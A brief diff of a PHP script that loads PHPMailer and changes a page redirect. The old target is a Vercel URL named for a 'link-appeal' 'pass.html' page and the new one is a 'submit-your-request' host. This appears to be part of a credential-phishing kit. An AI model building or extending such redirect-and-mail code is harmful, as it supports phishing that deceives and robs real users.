@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://pass-git-main-link-appeal12445s-projects.vercel.app/pass.html");
+header("Location: https://submit-your-request.wasmer.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
